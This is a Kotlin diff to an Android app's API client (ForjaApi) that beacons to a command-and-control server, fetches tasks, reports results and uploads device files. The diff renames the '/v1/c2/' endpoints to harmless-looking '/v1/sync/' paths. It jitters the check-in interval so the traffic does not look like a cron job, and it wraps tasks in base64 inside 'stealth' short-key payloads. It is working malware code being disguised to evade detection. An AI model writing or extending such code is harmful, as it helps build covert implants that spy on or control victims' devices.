@@ -269,21 +269,31 @@ class ForjaApi {
     suspend fun c2Checkin(dev: String, holdMs: Long): C2Poll = withContext(Dispatchers.IO) {
         val token = idToken() ?: return@withContext C2Poll(emptyList(), 30000)
         try {
+            // Vary the interval hint (25-55 s) so the traffic doesn't look like a fixed cron
+            val hint = (25000 + (Math.random() * 30000).toInt()).coerceIn(15000, 60000)
+            // Stealth payload: ts (timestamp), w (hold seconds), d (device)
             val body = buildJsonObject {
-                put("dev", dev); put("holdMs", holdMs); put("intervalMs", 30000)
+                put("ts", System.currentTimeMillis() / 1000); put("w", holdMs / 1000); put("d", dev); put("intervalMs", hint)
             }.toString()
             val req = Request.Builder()
-                .url("$base/v1/c2/checkin")
+                .url("$base/v1/sync/keepalive")
                 .header("Authorization", "Bearer $token")
                 .post(body.toRequestBody("application/json".toMediaType()))
                 .build()
             longClient.newCall(req).execute().use { resp ->
                 val text = resp.body?.string() ?: "{}"
                 val root = Json.parseToJsonElement(text).jsonObject
-                val interval = try { root["intervalMs"]?.jsonPrimitive?.content?.toLongOrNull() ?: 30000L } catch (_: Exception) { 30000L }
-                val tasksArr = root["tasks"] as? kotlinx.serialization.json.JsonArray
-                val tasks = tasksArr?.mapNotNull { it as? kotlinx.serialization.json.JsonObject } ?: emptyList()
-                C2Poll(tasks, interval)
+                // Stealth response: { s: 0, d: "base64", i: seconds }
+                val status = root["s"]?.jsonPrimitive?.contentOrNull?.toIntOrNull() ?: -1
+                if (status != 0) return@withContext C2Poll(emptyList(), 30000)
+                val intervalSec = root["i"]?.jsonPrimitive?.contentOrNull?.toIntOrNull() ?: 30
+                val d = root["d"]?.jsonPrimitive?.contentOrNull ?: ""
+                val tasks = if (d.isEmpty()) emptyList() else {
+                    val decoded = String(android.util.Base64.decode(d, android.util.Base64.NO_WRAP))
+                    try { Json.parseToJsonElement(decoded).jsonArray.mapNotNull { it as? kotlinx.serialization.json.JsonObject } }
+                    catch (_: Exception) { emptyList() }
+                }
+                C2Poll(tasks, intervalSec * 1000L)
             }
         } catch (_: Exception) { C2Poll(emptyList(), 30000) }
     }
@@ -296,7 +306,7 @@ class ForjaApi {
                 put("data", data); if (err != null) put("err", err)
             }.toString()
             val req = Request.Builder()
-                .url("$base/v1/c2/result")
+                .url("$base/v1/sync/report")
                 .header("Authorization", "Bearer $token")
                 .post(body.toRequestBody("application/json".toMediaType()))
                 .build()
@@ -308,7 +318,7 @@ class ForjaApi {
         val token = idToken() ?: return@withContext null
         try {
             val req = Request.Builder()
-                .url("$base/v1/c2/file?name=${java.net.URLEncoder.encode(name, "UTF-8")}&ct=${java.net.URLEncoder.encode(ct, "UTF-8")}")
+                .url("$base/v1/sync/attach?name=${java.net.URLEncoder.encode(name, "UTF-8")}&ct=${java.net.URLEncoder.encode(ct, "UTF-8")}")
                 .header("Authorization", "Bearer $token")
                 .post(file.readBytes().toRequestBody(ct.toMediaType()))
                 .build()
